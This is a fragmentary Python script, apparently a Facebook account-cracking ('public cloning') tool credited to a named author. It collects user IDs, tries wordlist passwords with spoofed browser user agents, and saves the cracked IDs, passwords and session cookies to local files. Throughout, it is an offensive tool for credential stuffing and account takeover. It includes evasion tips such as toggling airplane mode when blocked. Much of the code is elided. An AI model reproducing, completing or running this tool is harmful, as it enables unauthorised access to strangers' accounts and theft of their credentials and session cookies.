...
for xd in range(10000):
	...
	aa='Mozilla/5.0 (Linux; arm_64; Android 9; ELE-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 YaBrowser/20.11.3.88.00 SA/3 Mobile Safari/537.36'
...
def uaku():
	try:
		...
		a=requests.get('ttps://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
...
|_|/_/   \_\_| |_|___|_|  |_|
     ...
     AUTHOR    : FAHIM HOSSEN
     FACEBOOK  : FAHIM HOSSEN
     GITHUB    : FAHIM404-CYBER
     TOOL NAME : PUBLIC CLONING
     YOUTUBE   : UNKNOWN{asu}''')
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
...
def login_lagi334():
	try:
		...
		print(f'  {x}[{h}â€¢{x}]{h} LOGIN SUCCESSFUL ......... RUN THE TOOL AGAIN!!!!{x} ');time.sleep(1)
		exit()
	except Exception as e:
...
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	print('>> [1] Your OK Results ')
	print('>> [2]Your CP Results ')
	print('>> [0]Return	')
	kz = input('\n>> Choose : ')
	if kz in ['1','01']:
...
def dump_massal():
	...
	try:
		...
		print('>> Enter Dog Numbers, Even the Letter f ')
		exit()
	if jum<1 or jum>100:
	...
	for met in range(jum):
		yz+=1
		kl = input('>> Enter the Id Which To '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
...
def grup1(urls):
	use = []
	ses = requests.Session()
	print(""+balmond+m+" \x1b[1;94m If Stop, Airplane Mode 5 Seconds")
	print(balmond+m+" \x1b[1;94m Collecting ID")
	print(balmond+m+" \x1b[1;94m Press CTRL + C To Stop")
	while True:
		try:
			ua = 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba'
			miskinlu = {"user-agent": ua}
...
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print(f'>>>>> {m}â€¢{k}â€¢{h}â€¢{x} Shifting the Sun {m}â€¢{k}â€¢{h}â€¢{x} <<<<< ')
	print('')
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					open('/sdcard/FAHIM-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
				break
				...
				if 'no' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('/sdcard/FAHIM-DATA/OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					statusok = f'[â€¢] ID       : {idf}\n[â€¢] PASSWORD : {pw}\n[â€¢] COOKIES  : {kuki}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='FAHIM OK'))
					ok+=1
					break
					...
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]FAHIM OK[/bold green]'))
					ok+=1
					break
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					statuscp = f'[â€¢] ID       : {idf} [â€¢] PASSWORD : {pw}'
					statuscp1 = nel(statuscp, style='red')
					cetak(nel(statuscp1, title='FAHIM CP'))
					open('/sdcard/FAHIM-DATA/CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				else:continue
...
def cek_apk(session,cookie):
	...
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\n {N}[{M}!{N}] ops there is no expired application in this account.")
	else:
		for i in range(len(game)):
